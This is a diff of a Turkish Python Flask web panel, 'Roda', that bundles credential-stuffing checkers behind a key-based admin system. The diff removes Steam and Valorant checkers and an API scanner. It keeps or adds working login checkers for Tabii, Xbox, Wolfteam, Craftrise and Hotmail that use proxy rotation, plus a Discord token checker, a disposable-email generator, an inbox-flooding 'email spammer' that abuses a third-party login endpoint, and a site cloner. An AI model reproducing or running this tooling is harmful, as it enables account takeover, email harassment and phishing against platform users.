@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Roda - TÜM CHECKER'LAR TEK YERDE
+Roda - TÜM CHECKER'LAR TEK YERDE (Web)
 Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
 """
 
-import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3
+import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures
 from datetime import datetime, timedelta
 from urllib.parse import urljoin, urlparse, parse_qs, quote
 import requests
@@ -15,7 +15,6 @@ from user_agent import generate_user_agent
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-urllib3.disable_warnings()
 
 # ============================================================
 # MASTER KEY (ENV'DEN AL, KODDA YOK)
@@ -49,7 +48,6 @@ def load_keys():
     return {}
 
 def save_keys(data):
-    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
     with open(KEYS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
@@ -97,39 +95,23 @@ def is_admin(key):
 # PLATFORMLAR (TÜM CHECKER'LAR)
 # ============================================================
 PLATFORMS = [
-    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
-    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
-    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
-    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
-    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
-    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
-    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
-    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
-    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
-    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
-    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
-    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
-    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
-    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
+    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
     {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
-    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
-    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
     {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
     {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
     {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
     {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
-    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
-    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
+    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
 ]
 
 # ============================================================
-# CHECKER FONKSİYONLARI (GERÇEK API)
+# CHECKER FONKSİYONLARI
 # ============================================================
 
 # ---- TABII ----
 TABII_BASE = "https://eu1.tabii.com/apigateway"
 
-def check_tabii_account(email, password, proxy=None):
+def check_tabii(email, password, proxy=None):
     proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
     session = requests.Session()
     session.headers.update({
@@ -191,7 +173,7 @@ def check_tabii_account(email, password, proxy=None):
     return result
 
 # ---- XBOX ----
-def check_xbox_account(email, password):
+def check_xbox(email, password):
     session = requests.Session()
     session.verify = False
     try:
@@ -216,7 +198,7 @@ def check_xbox_account(email, password):
         return {"status": "ERROR", "message": str(e)[:60]}
 
 # ---- WOLFTEAM ----
-def check_wolfteam_account(email, password):
+def check_wolfteam(email, password):
     try:
         session = requests.Session()
         login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
@@ -234,7 +216,7 @@ def check_wolfteam_account(email, password):
         return {"status": "ERROR", "message": str(e)[:60]}
 
 # ---- CRAFTRISE ----
-def check_craftrise_account(email, password):
+def check_craftrise(email, password):
     try:
         session = requests.Session()
         login_url = "https://www.craftrise.com.tr/posts/post-login.php"
@@ -254,7 +236,7 @@ def check_craftrise_account(email, password):
         return {"status": "ERROR", "message": str(e)[:60]}
 
 # ---- HOTMAIL ----
-def check_hotmail_account(email, password):
+def check_hotmail(email, password):
     try:
         session = requests.Session()
         session.verify = False
@@ -312,7 +294,7 @@ def check_token(token_type, token):
     return {"status": "ERROR", "message": "Bilinmeyen token tipi"}
 
 # ---- TIKTOK GEN ----
-def check_tiktok_username(username):
+def check_tiktok(username):
     try:
         headers = {"User-Agent": generate_user_agent()}
         r = requests.head(f"https://www.tiktok.com/@{username}", headers=headers, timeout=5)
@@ -325,212 +307,81 @@ def check_tiktok_username(username):
     except:
         return {"status": "ERROR", "message": "Bağlantı hatası"}
 
-# ---- STEAM (GERÇEK RSA + API) ----
-def check_steam_account(email, password):
+# ---- TEMP MAIL ----
+def generate_temp_mail():
     try:
-        session = requests.Session()
-        session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-        })
-        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": email}, timeout=8).json()
-        rsa = rsa_resp["response"]
-        key = RSA.construct((int(rsa["publickey_mod"], 16), int(rsa["publickey_exp"], 16)))
-        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
-        
-        resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
-            data={"account_name": email, "encrypted_password": enc_pwd, "encryption_timestamp": rsa["timestamp"], "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=8).json()
-        resp = resp.get("response", {})
-        steamid = resp.get("steamid")
-        if not steamid:
-            return {"status": "BAD", "message": "Giriş başarısız"}
-        if any(c.get("confirmation_type", 0) in (3, 4) for c in resp.get("allowed_confirmations", [])):
-            return {"status": "2FA", "message": "Steam Guard gerekli"}
-        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
-            data={"client_id": resp["client_id"], "request_id": resp["request_id"]}, timeout=8).json()
-        poll = poll.get("response", {})
-        access = poll.get("access_token")
-        if not access:
-            return {"status": "BAD", "message": "Token alınamadı"}
-        return {"status": "HIT", "message": f"Steam giriş başarılı (SteamID: {steamid})", "details": {"steamid": steamid}}
+        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
+        domain = dom_res['hydra:member'][0]['domain']
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        email = f"{user}@{domain}"
+        create_payload = {"address": email, "password": password}
+        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
+        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
+        token = token_res['token']
+        return {"success": True, "email": email, "password": password, "token": token}
     except Exception as e:
-        return {"status": "ERROR", "message": str(e)[:60]}
+        return {"success": False, "error": str(e)}
 
-# ---- VALORANT (GERÇEK RIOT API) ----
-def check_valorant_account(email, password):
-    session = requests.Session()
-    session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/json'
-    })
-    result = {"status": "ERROR", "details": {}, "message": ""}
+def get_temp_mail_messages(token):
     try:
-        auth_payload = {"client_id": "riot-client", "nonce": "1", "redirect_uri": "http://localhost/redirect", "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
-        r = session.post("https://auth.riotgames.com/api/v1/authorization", json=auth_payload, timeout=10)
-        if r.status_code != 200:
-            result["status"] = "BAD"
-            result["message"] = "Auth başarısız"
-            return result
-        login_payload = {"type": "auth", "username": email, "password": password, "remember": False}
-        r = session.put("https://auth.riotgames.com/api/v1/authorization", json=login_payload, timeout=10)
-        if r.status_code != 200:
-            result["status"] = "BAD"
-            result["message"] = "Sunucu hatası"
-            return result
-        data = r.json()
-        if "error" in data:
-            if "multifactor" in str(data):
-                result["status"] = "2FA"
-                result["message"] = "2FA gerekli"
-                return result
-            result["status"] = "BAD"
-            result["message"] = data.get("error", "Giriş reddedildi")
-            return result
-        if "response" in data and "parameters" in data["response"]:
-            uri = data["response"]["parameters"]["uri"]
-            if "access_token=" in uri:
-                token = uri.split("access_token=")[1].split("&")[0]
-                session.headers.update({"Authorization": f"Bearer {token}"})
-            else:
-                result["status"] = "BAD"
-                result["message"] = "Token alınamadı"
-                return result
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "messages": res.json().get('hydra:member', [])}
+        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def read_temp_mail(token, msg_id):
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "message": res.json()}
+        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+# ---- EMAIL SPAMMER ----
+def send_spam(target_email):
+    try:
+        headers = {
+            'authority': 'api.kidzapp.com',
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': generate_user_agent()
+        }
+        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
+        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
+        if '"message":"EMAIL SENT"' in res.text:
+            return {"success": True, "message": "Paket iletildi"}
         else:
-            result["status"] = "BAD"
-            result["message"] = "Token alınamadı"
-            return result
-        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
-        if r.status_code == 200:
-            ui = r.json()
-            result["details"]["puuid"] = ui.get("sub", "")
-            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
-        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
-        if r.status_code == 200:
-            ent = r.json()
-            if ent.get("entitlements_token"):
-                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})
-        region = "eu"
-        try:
-            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
-            if r.status_code == 200:
-                region = r.json().get("affinity", "eu")
-        except:
-            pass
-        puuid = result["details"].get("puuid")
-        if not puuid:
-            result["status"] = "BAD"
-            result["message"] = "PUUID alınamadı"
-            return result
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
-            if r.status_code == 200:
-                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
-        except:
-            pass
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
-            if r.status_code == 200:
-                w = r.json()
-                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
-                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
-        except:
-            pass
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
-            if r.status_code == 200:
-                result["details"]["skins"] = len(r.json().get("Entitlements", []))
-        except:
-            pass
-        try:
-            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
-            if r.status_code == 200:
-                mmr = r.json()
-                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
-                if ranked:
-                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
-                    if seasons:
-                        first = list(seasons.values())[0]
-                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
-        except:
-            pass
-        try:
-            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
-            if r.status_code == 200:
-                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
-        except:
-            pass
-        result["status"] = "HIT"
-        result["message"] = "Giriş başarılı"
-        add_log(f"Valorant HIT: {email} | Level:{result['details'].get('level','?')} VP:{result['details'].get('vp','?')} Skin:{result['details'].get('skins','?')}", "SUCCESS")
+            return {"success": False, "message": "Sunucu isteği reddetti"}
     except Exception as e:
-        result["status"] = "ERROR"
-        result["message"] = str(e)[:60]
-    return result
+        return {"success": False, "message": str(e)[:60]}
 
-# ============================================================
-# KATEGORİZASYON / EXTRACT / PROXY / SCANNER (KISALTILDI)
-# ============================================================
-def categorize_endpoint(endpoint):
-    ep = endpoint.lower()
-    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
-        return 'Auth'
-    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
-        return 'Admin'
-    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
-        return 'User'
-    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
-        return 'Health'
-    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
-        return 'API'
+# ---- SİTE KOPYALA ----
+def copy_site(url):
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9'
+    }
+    resp = requests.get(url, headers=headers, timeout=15)
+    resp.raise_for_status()
+    soup = BeautifulSoup(resp.text, 'html.parser')
+    base_tag = soup.new_tag('base', href=url)
+    if soup.head:
+        soup.head.insert(0, base_tag)
     else:
-        return 'Genel'
+        new_head = soup.new_tag('head')
+        new_head.append(base_tag)
+        soup.html.insert(0, new_head)
+    return soup.prettify()
 
-def extract_from_html(html, base_url):
-    endpoints = set()
-    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
-        href = m.group(1)
-        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
-            endpoints.add(href)
-    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
-def extract_from_js(js, base_url):
-    endpoints = set()
-    patterns = [
-        r'fetch\s*\(\s*["\']([^"\']+)["\']',
-        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
-        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
-        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
-        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
-        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
-        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
-        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
-    ]
-    for pattern in patterns:
-        for m in re.finditer(pattern, js, re.I):
-            endpoints.add(m.group(1))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
-def extract_from_json(obj, base_url):
-    endpoints = set()
-    if isinstance(obj, dict):
-        for k, v in obj.items():
-            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
-                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
-                    endpoints.add(v)
-            elif isinstance(v, (dict, list)):
-                endpoints.update(extract_from_json(v, base_url))
-    elif isinstance(obj, list):
-        for item in obj:
-            endpoints.update(extract_from_json(item, base_url))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
+# ---- PROXY ----
 def fetch_proxies():
     sources = [
         "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -550,181 +401,6 @@ def fetch_proxies():
         except:
             pass
     return list(proxies)
-
-# TARAMA MOTORU (API Discovery)
-class APIScanner:
-    def __init__(self, proxy_list=None):
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json, text/plain, */*',
-        })
-        if proxy_list:
-            proxy = random.choice(proxy_list) if proxy_list else None
-            if proxy:
-                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-        self.discovered = set()
-        self.results = []
-        self.base_url = ""
-
-    def scan(self, domain):
-        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
-        self.base_url = self.base_url.rstrip('/')
-        self.results = []
-        self.discovered = set()
-        static = self._get_common_endpoints()
-        for ep in static:
-            full = urljoin(self.base_url, ep)
-            if full not in self.discovered:
-                self._test(full, ep)
-        self._crawl(self.base_url)
-        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
-        for js_url in js_urls:
-            self._crawl_js(js_url)
-        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
-        for api_url in api_urls:
-            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
-                self._crawl(api_url)
-        return self.results
-
-    def _get_common_endpoints(self):
-        return [
-            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
-            "/rest", "/rest/v1", "/rest/v2",
-            "/graphql", "/api/graphql", "/v1/graphql",
-            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
-            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
-            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
-            "/admin", "/dashboard", "/panel", "/manage", "/system",
-            "/health", "/ping", "/status", "/check", "/heartbeat",
-            "/search", "/query", "/find", "/list",
-            "/upload", "/download", "/file", "/files",
-            "/notify", "/notification", "/alert",
-            "/report", "/logs", "/audit", "/analytics",
-            "/config", "/configuration",
-            "/sync", "/import", "/export", "/backup",
-            "/reset", "/recover", "/verify", "/validate",
-            "/2fa", "/twofactor", "/mfa",
-            "/webhook", "/callback", "/hook",
-            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
-            "/passport", "/passport/web", "/passport/web/email/login",
-            "/passport/web/phone/login", "/passport/web/sms/send",
-            "/api/user/info", "/api/user/follow", "/api/user/unfollow",
-            "/api/video/list", "/api/video/info", "/api/video/upload",
-            "/api/comment/list", "/api/comment/post", "/api/comment/delete",
-            "/api/like", "/api/unlike", "/api/share",
-            "/api/live", "/api/live/start", "/api/live/end",
-            "/api/shop", "/api/product", "/api/order",
-            "/v1/auth", "/v1/login", "/v1/logout", "/v1/register",
-            "/v1/user", "/v1/users", "/v1/account", "/v1/profile",
-            "/v1/game", "/v1/games", "/v1/inventory", "/v1/currency",
-            "/v1/friends", "/v1/groups", "/v1/chat", "/v1/messages",
-            "/v1/avatar", "/v1/outfits", "/v1/thumbnails",
-            "/v1/asset", "/v1/assets", "/v1/marketplace",
-            "/v1/developer", "/v1/universes", "/v1/places",
-            "/api/shows", "/api/movies", "/api/genres", "/api/titles",
-            "/api/search", "/api/recommendations", "/api/trending",
-            "/api/user/profile", "/api/user/history", "/api/user/ratings",
-            "/api/user/list", "/api/user/watchlist", "/api/user/continue",
-            "/api/subscription", "/api/plans", "/api/payment",
-            "/api/account", "/api/settings", "/api/devices",
-            "/api/v9", "/api/v9/auth", "/api/v9/login", "/api/v9/register",
-            "/api/v9/users", "/api/v9/guilds", "/api/v9/channels",
-            "/api/v9/messages", "/api/v9/webhooks", "/api/v9/oauth2",
-            "/api/v9/applications", "/api/v9/voice", "/api/v9/stickers",
-            "/api/v9/emojis", "/api/v9/invites", "/api/v9/connections",
-            "/api/v1/me", "/api/v1/playlists", "/api/v1/tracks", "/api/v1/albums",
-            "/api/v1/artists", "/api/v1/search", "/api/v1/recommendations",
-            "/api/v1/player", "/api/v1/queue", "/api/v1/library",
-            "/api/v1/follow", "/api/v1/shows", "/api/v1/episodes",
-            "/api/v1/users", "/api/v1/browse", "/api/v1/categories",
-            "/api/epic", "/api/epic/v1", "/api/epic/v2",
-            "/api/fortnite", "/api/fortnite/v1", "/api/fortnite/v2",
-            "/api/account", "/api/account/v1", "/api/account/v2",
-            "/api/auth", "/api/auth/v1", "/api/auth/v2",
-            "/api/catalog", "/api/catalog/v1", "/api/catalog/v2",
-            "/api/games", "/api/games/v1", "/api/games/v2",
-            "/api/launcher", "/api/launcher/v1",
-            "/api/store", "/api/store/v1", "/api/store/v2",
-            "/api/ecommerce", "/api/ecommerce/v1",
-            "/api/matchmaking", "/api/matchmaking/v1",
-            "/api/parties", "/api/parties/v1",
-            "/api/friends", "/api/friends/v1",
-            "/api/presence", "/api/presence/v1",
-            "/api/cloudstorage", "/api/cloudstorage/v1",
-            "/api/telemetry", "/api/telemetry/v1",
-            "/api/statistics", "/api/statistics/v1",
-            "/api/leaderboards", "/api/leaderboards/v1",
-            "/api/achievements", "/api/achievements/v1",
-            "/api/hesap", "/api/hesap/v1", "/api/hesap/v2",
-            "/api/oyun", "/api/oyun/v1", "/api/oyun/v2",
-            "/api/item", "/api/item/v1", "/api/item/v2",
-            "/api/sat", "/api/sat/v1", "/api/sat/v2",
-            "/api/alis", "/api/alis/v1", "/api/alis/v2",
-            "/api/bakiye", "/api/bakiye/v1",
-            "/api/profil", "/api/profil/v1",
-            "/api/giris", "/api/giris/v1", "/api/giris/v2",
-            "/api/kayit", "/api/kayit/v1",
-            "/api/sifre", "/api/sifre/v1", "/api/sifre/v2",
-            "/api/epin", "/api/epin/v1", "/api/epin/v2",
-            "/api/pin", "/api/pin/v1", "/api/pin/v2",
-            "/api/kod", "/api/kod/v1", "/api/kod/v2",
-            "/api/satin", "/api/satin/v1",
-            "/api/satiliyor", "/api/satiliyor/v1",
-            "/api/ilan", "/api/ilan/v1",
-            "/api/hesapcomtr", "/api/hesapcomtr/v1",
-            "/api/itemsatis", "/api/itemsatis/v1",
-            "/api/epinify", "/api/epinify/v1",
-            "/api/minecraft", "/api/minecraft/v1",
-        ]
-
-    def _test(self, full_url, endpoint):
-        if full_url in self.discovered:
-            return
-        self.discovered.add(full_url)
-        try:
-            r = self.session.get(full_url, timeout=3, allow_redirects=False)
-            if r.status_code < 500:
-                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'GET', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
-        except:
-            pass
-        try:
-            r = self.session.post(full_url, json={"test": "data"}, timeout=3, allow_redirects=False)
-            if r.status_code < 500:
-                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'POST', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
-        except:
-            pass
-
-    def _crawl(self, url):
-        try:
-            r = self.session.get(url, timeout=5, allow_redirects=False)
-            if r.status_code != 200:
-                return
-            ct = r.headers.get('Content-Type', '').lower()
-            if 'text/html' in ct:
-                for ep in extract_from_html(r.text, self.base_url):
-                    if ep not in self.discovered:
-                        self._test(ep, ep.replace(self.base_url, '') or '/')
-            elif 'application/json' in ct:
-                try:
-                    data = r.json()
-                    for ep in extract_from_json(data, self.base_url):
-                        if ep not in self.discovered:
-                            self._test(ep, ep.replace(self.base_url, '') or '/')
-                except:
-                    pass
-        except:
-            pass
-
-    def _crawl_js(self, url):
-        try:
-            r = self.session.get(url, timeout=4)
-            if r.status_code == 200:
-                for ep in extract_from_js(r.text, self.base_url):
-                    if ep not in self.discovered:
-                        self._test(ep, ep.replace(self.base_url, '') or '/')
-        except:
-            pass
 
 # ============================================================
 # FLASK ROTALARI
@@ -758,117 +434,36 @@ def get_logs():
         return jsonify({"error": "Yetkisiz"}), 401
     return jsonify({"logs": LOGS[-100:]})
 
-# ---- TÜM CHECKER ROUTE'LARI ----
-@app.route("/api/tabii_check", methods=["POST"])
-def tabii_check():
+# ---- CHECKER ROUTE'LARI ----
+@app.route("/api/check", methods=["POST"])
+def check():
     data = request.json
+    platform = data.get("platform", "")
     email = data.get("email", "").strip()
     password = data.get("password", "").strip()
     proxy = data.get("proxy", None)
     if not email or not password:
         return jsonify({"error": "Eksik"}), 400
-    result = check_tabii_account(email, password, proxy)
+
+    if platform == "Tabii":
+        result = check_tabii(email, password, proxy)
+    elif platform == "Xbox & MC":
+        result = check_xbox(email, password)
+    elif platform == "Wolfteam":
+        result = check_wolfteam(email, password)
+    elif platform == "Craftrise":
+        result = check_craftrise(email, password)
+    elif platform == "Hotmail":
+        result = check_hotmail(email, password)
+    elif platform == "Token Check":
+        result = check_token("discord", email)  # email alanına token girilir
+    elif platform == "TikTok Gen":
+        result = check_tiktok(email)
+    else:
+        return jsonify({"error": "Geçersiz platform"}), 400
     return jsonify(result)
 
-@app.route("/api/xbox_check", methods=["POST"])
-def xbox_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_xbox_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/wolfteam_check", methods=["POST"])
-def wolfteam_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_wolfteam_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/craftrise_check", methods=["POST"])
-def craftrise_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_craftrise_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/hotmail_check", methods=["POST"])
-def hotmail_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_hotmail_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/token_check", methods=["POST"])
-def token_check():
-    data = request.json
-    token_type = data.get("token_type", "discord")
-    token = data.get("token", "").strip()
-    if not token:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_token(token_type, token)
-    return jsonify(result)
-
-@app.route("/api/tiktok_gen", methods=["POST"])
-def tiktok_gen():
-    data = request.json
-    username = data.get("username", "").strip()
-    if not username:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_tiktok_username(username)
-    return jsonify(result)
-
-@app.route("/api/steam_check", methods=["POST"])
-def steam_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_steam_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/valorant_check", methods=["POST"])
-def valorant_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_valorant_account(email, password)
-    return jsonify(result)
-
-@app.route("/api/scan", methods=["GET"])
-def scan():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
-    domain = request.args.get("domain")
-    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
-    use_proxy = request.args.get("use_proxy", "false").lower() == "true"
-
-    def generate():
-        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
-        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
-        results = scanner.scan(domain)
-        for res in results:
-            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
-        yield "data: [DONE]\n\n"
-        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint bulundu", "SUCCESS")
-
-    return Response(generate(), mimetype="text/event-stream")
-
+# ---- ADMIN ROUTE'LARI ----
 @app.route("/api/admin/keys")
 def admin_keys():
     key = request.args.get("key")
@@ -909,40 +504,22 @@ def admin_delete():
 
 @app.route("/api/admin/webhook", methods=["POST"])
 def admin_webhook():
+    # Webhook gönderme (Discord)
     data = request.json
     key = data.get("master_key")
     if not is_admin(key):
         return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
     url = data.get("webhook_url")
-    endpoints = data.get("endpoints", [])
-    categories = data.get("categories", [])
-    if not url or not endpoints:
+    content = data.get("content", "")
+    if not url or not content:
         return jsonify({"success": False, "message": "Eksik parametre"}), 400
-    filtered = [ep for ep in endpoints if ep['category'] in categories]
-    if not filtered:
-        return jsonify({"success": False, "message": "Seçili kategoride endpoint yok"}), 400
-    content = "🔱 RODA API TARAMA RAPORU\n"
